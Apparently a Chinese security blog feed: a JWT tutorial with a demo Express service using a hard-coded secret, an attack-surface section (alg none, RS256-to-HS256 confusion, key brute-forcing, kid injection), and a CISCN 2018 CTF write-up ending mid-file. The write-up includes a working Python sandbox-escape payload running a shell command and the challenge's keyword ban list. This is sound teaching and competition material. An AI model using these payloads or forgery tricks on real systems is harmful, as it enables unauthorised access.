简单应用</h1><p>在本地运行起简单的基于Express的可发放和处理JWT的服务。</p><ol><li><strong>安装Node.js。</strong>Node.js是JavaScript运行时环境，采用轻量高效的事件驱动、无阻塞I/O模型，拥有最大的开源库生态nmp。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Windows平台可在 https:<span class="comment">//nodejs.org/en/download/ 下载安装包 </span></span><br><span class="line">*nix 平台可根据 https:<span class="comment">//nodejs.org/en/download/package-manager/ 提示使用包管理器安装</span></span><br></pre></td></tr></table></figure><ol><li><strong>安装Express</strong>，一款基于Node.js的快速、灵活、极简的Web框架。</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> http://expressjs.com/en/starter/installing.html</span></span><br><span class="line">mkdir D:\myapp &amp;&amp; cd D:\myapp </span><br><span class="line">（全部回车，保持默认配置）</span><br><span class="line">npm init </span><br><span class="line">npm install express --save</span><br></pre></td></tr></table></figure><ol><li><strong>运行本地服务</strong></li></ol><p>新建 <code>index.js</code> ，内容如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.get(<span class="string">'/'</span>, (req, res) =&gt; res.send(<span class="string">'Hello World!'</span>))</span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; <span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>))</span><br></pre></td></tr></table></figure><p>运行<code>node index.js</code> ，就可从本地访问 <code>http://localhost:3000</code> 。</p><ol><li><strong>安装必要模块：</strong> 适用于Node.js的JWT编解码模块 <code>node-jwt-simple</code> 和 cookie解析模块 <code>cookie-parser</code> </li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> https://github.com/hokaccha/node-jwt-simple</span></span><br><span class="line">npm install jwt-simple</span><br><span class="line">npm install cookie-parser</span><br></pre></td></tr></table></figure><ol><li><strong>一个简单的本地demo</strong> </li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.js</span></span><br><span class="line"><span class="comment">//http://expressjs.com/en/4x/api.html</span></span><br><span class="line"><span class="comment">//https://github.com/hokaccha/node-jwt-simple</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//一些初始化的工作</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>)</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">'jwt-simple'</span>)</span><br><span class="line"><span class="keyword">var</span> cookieParser = <span class="built_in">require</span>(<span class="string">'cookie-parser'</span>)</span><br><span class="line"><span class="keyword">var</span> jwt_secret = <span class="string">"this is a secret for jwt"</span></span><br><span class="line"><span class="keyword">const</span> app = express()</span><br><span class="line">app.use(cookieParser())</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/'</span>,(req,res)=&gt;res.redirect(<span class="string">'/help'</span>))</span><br><span class="line">app.get(<span class="string">'/help'</span>, (req, res) =&gt; &#123;</span><br><span class="line"><span class="keyword">var</span> RequstedURL=req.protocol+<span class="string">'://'</span>+req.get(<span class="string">'Host'</span>)</span><br><span class="line">res.send([ </span><br><span class="line"><span class="string">'GET '</span>+RequstedURL+<span class="string">'/login?user=name&amp;pass=passwd to get your JSON Web Token '</span> , </span><br><span class="line"><span class="string">'GET '</span>+RequstedURL+<span class="string">'/whoami to identify yourself'</span></span><br><span class="line">].join(<span class="string">'&lt;br&gt;'</span>))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/login'</span>,(req,res)=&gt;&#123;</span><br><span class="line"><span class="keyword">var</span> users=&#123;</span><br><span class="line"><span class="string">"admin"</span>:<span class="string">"admin_password_is_hard_to_guess"</span>,</span><br><span class="line"><span class="string">"test"</span>:<span class="string">"test123"</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> payload = &#123;<span class="string">"name"</span>:req.query.user&#125;</span><br><span class="line"><span class="keyword">if</span>(users[req.query.user]===req.query.pass)&#123;</span><br><span class="line">res.cookie(<span class="string">'jwt'</span>,jwt.encode(payload,jwt_secret))</span><br><span class="line">res.send(req.query.user +<span class="string">' logged in'</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;res.send(<span class="string">'login failed!'</span>)&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/whoami'</span>,(req,res)=&gt;&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;res.send(<span class="string">"you are logged in as :&lt;br&gt;"</span> +jwt.decode(req.cookies.jwt,jwt_secret)[<span class="string">'name'</span>])&#125;</span><br><span class="line"><span class="keyword">catch</span>(err) &#123;res.send(<span class="string">"your JWT is :&lt;br&gt;"</span>+req.cookies.jwt)&#125;</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">3000</span>, () =&gt; &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'Example app listening on port 3000!'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>推荐几个在线工具<ul><li><a href="https://jwt.io" target="_blank" rel="noopener">https://jwt.io</a> </li><li>by Sjoerd Langkemper<ul><li>支持 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php" target="_blank" rel="noopener">hs256</a> 算法</li><li>支持 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php" target="_blank" rel="noopener">rs256</a> 算法</li></ul></li><li>by Kenji Urushima <ul><li>支持更多算法  <a href="https://kjur.github.io/jsjws/tool_jwt.html" target="_blank" rel="noopener">kjur/jsjws</a>  </li></ul></li></ul></li></ul><h1 id="0x03-攻击面"><a href="#0x03-攻击面" class="headerlink" title="0x03 攻击面"></a>0x03 攻击面</h1><h2 id="发现敏感信息"><a href="#发现敏感信息" class="headerlink" title="发现敏感信息"></a>发现敏感信息</h2><p>JWT中的<code>header</code> 和 <code>payload</code> 虽然看起来不可读，但实际上都只经过简单编码，开发者可能误将敏感信息存储在里面。使用上述工具可以方便地解码JWT中前两部分的信息。</p><h2 id="指定算法为none"><a href="#指定算法为none" class="headerlink" title="指定算法为none"></a>指定算法为none</h2><p>上面提到算法 <code>none</code> 是JWT规范中强制要求实现的，但有些实现JWT的库直接将使用<code>none</code> 算法的token视为已经过校验。这样攻击者就可以设置<code>alg</code> 为<code>none</code> ，使<code>signature</code> 部分为空，然后构造包含任意<code>payload</code> 的JWT来欺骗服务端。</p><p><img src="1525158849660.png" alt="1525158849660"></p><h2 id="将签名算法从非对称类型改为对称类型"><a href="#将签名算法从非对称类型改为对称类型" class="headerlink" title="将签名算法从非对称类型改为对称类型"></a>将签名算法从非对称类型改为对称类型</h2><p>使用非对称加密算法（主要基于RSA、ECDSA，如S256）分发JWT的过程是使用私钥（private）加密生成JWT，使用公钥（public）解密验证。</p><p>使用对称加密算法（主要基于HMAC，如HS256）分发JWT的过程是使用同一个密钥（secret）生成和验证JWT。</p><p>如果服务端期待收到的算法类型为RS256，然后以RS256和public去验证JWT，而实际上收到的算法类型是HS256，那么服务端就可能尝试把public当作secret，然后用HS256算法解密验证JWT。</p><p>由于RS256的public人人都可获得，攻击者可以预先以public为密钥，用HS256算法伪造包含任意<code>payload</code> 的JWT，从而成功通过服务端的验证。</p><p><img src="1525160523495.png" alt="1525160523495"></p><h2 id="爆破密钥"><a href="#爆破密钥" class="headerlink" title="爆破密钥"></a>爆破密钥</h2><p>JWT的安全性依赖于密钥的保密性，任何拥有密钥的人都可以构造任何内容的合法token。</p><p>当一个JSON Web Token 被分发出去，如果密钥不够强壮就存在被爆破的风险，而且整个爆破过程可以离线进行。</p><p>已经有人写了一些工具，推荐如下：</p><ul><li><a href="https://github.com/jmaxxz/jwtbrute" target="_blank" rel="noopener">jwtbrute</a> </li><li><a href="https://github.com/Sjord/jwtcrack/blob/master/crackjwt.py" target="_blank" rel="noopener">Sjord’ python script</a> </li><li><a href="https://github.com/magnumripper/JohnTheRipper" target="_blank" rel="noopener">John the Ripper</a> </li></ul><h2 id="伪造密钥"><a href="#伪造密钥" class="headerlink" title="伪造密钥"></a>伪造密钥</h2><p>有时JWT采用<code>header</code> 中的<code>kid</code> 字段关联校验算法的密钥，这个密钥可能是对称加密的密钥，也可能是非对称加密的公钥。如果能够猜测<code>kid</code> 和 密钥的关联性，攻击者就可能修改<code>kid</code> 来欺骗服务端，使其校验时使用攻击者可控的密钥，于是攻击者就可以伪造任意内容的可通过校验的JWT。</p><h3 id="2017-HITB-Pasty"><a href="#2017-HITB-Pasty" class="headerlink" title="2017 HITB Pasty"></a>2017 HITB Pasty</h3><p>关联性：kid是密钥URI的一部分。</p><p><img src="1525359586004.png" alt="from cnblogs.com/dliv3/p/7450057.html"></p><h3 id="2018强网杯-easyweb"><a href="#2018强网杯-easyweb" class="headerlink" title="2018强网杯 easyweb"></a>2018强网杯 easyweb</h3><p>关联性：kid 带入数据库查询对应密钥，可联合查询或者盲注。</p><p>详见 <a href="http://findneo.github.io/180430ciscn/#easyweb">http://findneo.github.io/180430ciscn/#easyweb</a></p><h1 id="0x04-安全建议"><a href="#0x04-安全建议" class="headerlink" title="0x04 安全建议"></a>0x04 安全建议</h1><ul><li>验证函数应忽略JWT中的<code>algo</code> 字段，预先就明确JWT使用的算法，如果需要使用多种算法，可以在<code>header</code> 中使用表示”key ID” 的<code>kid</code> 字段，查询每个<code>kid</code> 对应的算法。</li><li>JWT/JWS 标准应该移除 <code>header</code> 中的<code>algo</code> 字段。JWT的许多安全缺陷都来自于开发者依赖这一客户端可控的字段。</li><li>开发者应升级相应库到最新版本，因为旧版本可能存在致命缺陷。</li></ul><h1 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h1><ul><li><a href="https://jwt.io/introduction/" target="_blank" rel="noopener">https://jwt.io/introduction/</a></li><li><a href="https://www.cnblogs.com/anny0404/p/5318692.html" target="_blank" rel="noopener">https://www.cnblogs.com/anny0404/p/5318692.html</a></li><li><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" target="_blank" rel="noopener">https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/</a></li><li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" target="_blank" rel="noopener">https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/</a></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>第十一届全国大学生信息安全竞赛“创新实践能力赛”</title>
      <link href="/180430ciscn/"/>
      <url>/180430ciscn/</url>
      
        <content type="html"><![CDATA[<p>全部赛题：<a href="https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180430-ciscn</a></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easyweb"><a href="#easyweb" class="headerlink" title="easyweb"></a>easyweb</h2><blockquote><p><a href="http://114.116.26.217/" target="_blank" rel="noopener">http://114.116.26.217/</a></p></blockquote><p>学习了一点 json web token ，但是没想到是个脑洞。（应该只是非预期解）</p><p>账户admin，空密码登陆。</p><p><code>ciscn{2a36b5f78a1d6a107212d82ee133c421}</code></p><p><img src="1525025826358.png" alt="1525025826358"></p><p><img src="1525025838819.png" alt="1525025838819"></p><p>有师傅在群里说HMAC的密钥放在数据库里，而kid是个注入点，可以通过联合查询控制查询结果，然后伪造签名。</p><p>从开始做到赛后试着复现都一直纠结<code>alg</code> 是sha256的问题，以为密钥是用来加盐，然后就自己胡乱加盐，陷入困境。后来仔细了解了一下，HMAC就算是一个比较复杂的加盐算法吧，自己加没啥意思，而且jwt也不支持纯粹sha256。</p><p>事实证明把sha256改成HS256就好了。这里有两种可能，一是后端写死算法为HS256，然后header里面写成了sha256，二是算法根据<code>alg</code> 的值确定，我们传入HS256所以按照HS256来计算。</p><p>经过测试发现后端甚至根本不在乎有没<code>alg</code> ，，，，所以说做题思路还是要灵活一些。</p><p>kid的值随意传，奇怪一点就行，只要让它查询不出结果，那么我们联合查询的值就会作为最后的密钥。</p><p><img src="1527354162506.png" alt="1527354162506"></p><p>参考：</p><ul><li><a href="https://www.jianshu.com/p/e64d96b4a54d" target="_blank" rel="noopener">https://www.jianshu.com/p/e64d96b4a54d</a></li><li><a href="https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data" target="_blank" rel="noopener">https://security.stackexchange.com/questions/79577/whats-the-difference-between-hmac-sha256key-data-and-sha256key-data</a></li><li><a href="https://docs.python.org/2/library/hmac.html" target="_blank" rel="noopener">https://docs.python.org/2/library/hmac.html</a></li></ul><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h2><blockquote><p>本题目为验证码破解，选手需在指定时间完成对验证码的破解，成功后获取Flag。请使用队伍token进行登陆。<br>参考数据：<a href="https://share.weiyun.com/6e055fc3402e86c7cbb5384f1a6b41b8" target="_blank" rel="noopener">https://share.weiyun.com/6e055fc3402e86c7cbb5384f1a6b41b8</a></p><p><a href="https://game.captcha.qq.com/hslj/html/hslj/" target="_blank" rel="noopener">https://game.captcha.qq.com/hslj/html/hslj/</a></p></blockquote><p>题目有点问题，手动玩了一会儿。</p><p><code>ciscn{12qiftb1qj12mbzm1xmjd2iix2ibqz7i}</code></p><p><img src="1524887059191.png" alt="1524887059191"> </p><p>后来换成输验证码得flag了。</p><p><img src="1525027778352.png" alt="1525027778352"></p><h2 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h2><blockquote><p>请从图中找出密码。</p><p><img src="task_ctf_08_354M5YB.png" alt="附件下载"> </p></blockquote><p><code>binwalk -e</code> 分离得到 <code>97E4</code> 和 <code>97E4.zlib</code> 两个文件，后者是前者的 zlib 压缩文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">print</span> zlib.decompress(open(<span class="string">'97E4.zlib'</span>,<span class="string">'rb'</span>).read())==open(<span class="string">'97E4'</span>,<span class="string">'rb'</span>).read() </span><br><span class="line"><span class="comment"># got True</span></span><br></pre></td></tr></table></figure><p>文件<code>97E4</code> 内容的base64解码后稍做处理是一个加密的压缩包。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">t=open(<span class="string">'97E4'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">m=base64.b64decode(t).encode(<span class="string">"hex"</span>)</span><br><span class="line">n=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(m)/<span class="number">4</span>):</span><br><span class="line">n+=m[i*<span class="number">4</span>+<span class="number">2</span>:i*<span class="number">4</span>+<span class="number">4</span>]+m[i*<span class="number">4</span>:i*<span class="number">4</span>+<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"><span class="comment"># 504b040300140001000030904c97542e7f25005a0000004e0000000400006f6365647ab0d6a3f3bbc8060511ce0c8b62793d8d39caf2b644325509c991cb202dc981e60ea354ca8de79f3bc187f6719f4738adf24fa3ca2d9d7b8adda175d833d1c0264225c62d86784977cf5973989ea77ddbbf31060aef47124fca4b500201003f00140001000030904c97542e7f25005a0000004e00000004002400000000000000200000000000006f636564000a002000000000000100189800e452da8501d3bcf6ace5da8701d3bcf6ace5da8701d34b500605000000000001000100560000007c000000dc505b74796f68206e2e325d370a0d3e3e203e7da87da87da80a0d0a0d7254636162656361206b6d28736f207465726563746e63206c61206c616c74733a290a0d20206946656c2220703c737965686c6c3023223e202c696c656e3120202c6e693c206f6d7564656c0d3e200a2020a820a87da87d0d7d5a0a7265446f766973696f69456e7272726f203a7da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da87da83c20202d617073736f7764723b200d293e0a3e3e0020</span></span><br></pre></td></tr></table></figure><p>大致内容如下：</p><p><img src="1525026681311.png" alt="1525026681311"></p><p>对比得到密码： <code>integer division or modulo by zero</code> </p><p><img src="1525026721625.png" alt="1525026721625"></p><p>得到一串编码后字符：</p><p><img src="1525026922897.png" alt="1525026922897"></p><p>解码得到 <code>CISCN{C16E6F6E065DA0306E318D095C68BDC0}</code> </p><p><img src="1525026880755.png" alt="1525026880755"></p><h2 id="run"><a href="#run" class="headerlink" title="run"></a>run</h2><p>参考链接：</p><ul><li><a href="http://cauc.me/2017/11/16/python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/" target="_blank" rel="noopener">http://cauc.me/2017/11/16/python%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87/</a></li><li><a href="https://blog.csdn.net/qq_35078631/article/details/78504415" target="_blank" rel="noopener">https://blog.csdn.net/qq_35078631/article/details/78504415</a></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line"><span class="keyword">print</span> ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__getattribute__(<span class="string">'func_global'</span>+<span class="string">'s'</span>)[<span class="string">'linecache'</span>].__dict__[<span class="string">'o'</span>+<span class="string">'s'</span>].__dict__[<span class="string">'sy'</span>+<span class="string">'stem'</span>](<span class="string">'ca'</span>+<span class="string">'t'</span>+<span class="string">' /home/ctf/5c72a1d444cf3121a5d25f2db4147ebb'</span>)</span><br><span class="line"><span class="comment"># ciscn&#123;db87226edc7f9aff82a6b524053eef9e&#125;</span></span><br></pre></td></tr></table></figure><p><img src="1525027473718.png" alt="1525027473718"></p><p>顺便dump下来几个文件</p><p><img src="1525027583658.png" alt="1525027583658"></p><p>cpython.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> pythonapi,POINTER,py_object</span><br><span class="line"></span><br><span class="line">_get_dict = pythonapi._PyObject_GetDictPtr</span><br><span class="line">_get_dict.restype = POINTER(py_object)</span><br><span class="line">_get_dict.argtypes = [py_object]</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> pythonapi,POINTER,py_object</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_dict</span><span class="params">(ob)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> _get_dict(ob).contents.value</span><br></pre></td></tr></table></figure><p>sandbox.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Date    : 2018-04-09 23:30:58</span></span><br><span class="line"><span class="comment"># @Author  : Xu (you@example.org)</span></span><br><span class="line"><span class="comment"># @Link    : https://xuccc.github.io/</span></span><br><span class="line"><span class="comment"># @Version : $Id$</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> modules</span><br><span class="line"><span class="keyword">from</span> cpython <span class="keyword">import</span> get_dict</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> FunctionType</span><br><span class="line"></span><br><span class="line">main  = modules[<span class="string">'__main__'</span>].__dict__</span><br><span class="line">origin_builtins = main[<span class="string">'__builtins__'</span>].__dict__</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_type</span><span class="params">()</span>:</span></span><br><span class="line">    type_dict = get_dict(type)</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__bases__'</span>]</span><br><span class="line">    <span class="keyword">del</span> type_dict[<span class="string">'__subclasses__'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_func_code</span><span class="params">()</span>:</span></span><br><span class="line">    func_dict = get_dict(FunctionType)</span><br><span class="line">    <span class="keyword">del</span> func_dict[<span class="string">'func_code'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_import</span><span class="params">(__import__,whiteList)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">importer</span><span class="params">(name,globals=&#123;&#125;,locals=&#123;&#125;,fromlist=[],level=<span class="number">-1</span>)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">return</span> __import__(name,globals,locals,fromlist,level)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"HAHA,[%s]  has been banned~"</span> % name</span><br><span class="line">    <span class="keyword">return</span> importer</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ReadOnly</span><span class="params">(dict)</span>:</span></span><br><span class="line">    <span class="string">"""docstring for ReadOnlu"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__delitem__</span><span class="params">(self,keys)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self,key,default=None)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">popitem</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">setdefault</span><span class="params">(self,key,value)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setitem__</span><span class="params">(self,key,value)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__setattr__</span><span class="params">(self, name, value)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self,dict,**kwargs)</span>:</span></span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">":("</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">builtins_clear</span><span class="params">()</span>:</span></span><br><span class="line">    whiteList = <span class="string">"raw_input  SyntaxError   ValueError  NameError  Exception __import__"</span>.split(<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> mod <span class="keyword">in</span> __builtins__.__dict__.keys():</span><br><span class="line">        <span class="keyword">if</span> mod <span class="keyword">not</span> <span class="keyword">in</span> whiteList:</span><br><span class="line">            <span class="keyword">del</span> __builtins__.__dict__[mod]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">input_filter</span><span class="params">(string)</span>:</span></span><br><span class="line">    ban = <span class="string">"exec eval pickle os subprocess input sys ls cat"</span>.split(<span class="string">" "</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ban:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> string.lower():</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"&#123;&#125; has been banned!"</span>.format(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    <span class="keyword">return</span> string</span><br><span class="line"></span><br><span class="line"><span class="comment"># delete_type();</span></span><br><span class="line"><span class="keyword">del</span> delete_type</span><br><span class="line">delete_func_code();<span class="keyword">del</span> delete_func_code</span><br><span class="line">builtins_clear();<span class="keyword">del</span> builtins_clear</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whiteMod = []</span><br><span class="line">origin_builtins[<span class="string">'__import__'</span>] = safe_import(__import__,whiteMod)</span><br><span class="line">safe_builtins = ReadOnly(origin_builtins);<span class="keyword">del</span> ReadOnly</span><br><span class="line">main[<span class="string">'__builtins__'</span>] = safe_builtins;<span class="keyword">del</span> safe_builtins</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> get_dict,modules,origin_builtins,safe_import,whiteMod,main,FunctionType</span><br><span class="line"><span class="keyword">del</span> __builtins__, __doc__, __file__, __name__, __package__</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"""</span></span><br><span class="line"><span class="string">  ____</span></span><br><span class="line"><span class="string"> |  _ \ _   _ _ __</span></span><br><span class="line"><span class="string"> | |_) | | | | '_ \</span></span><br><span class="line"><span class="string"> |  _ &lt;| |_| | | | |</span></span><br><span class="line"><span class="string"> |_| \_\\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Escape from the dark house built with python :)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Try to getshell then find the flag!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    inp = raw_input(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    cmd = 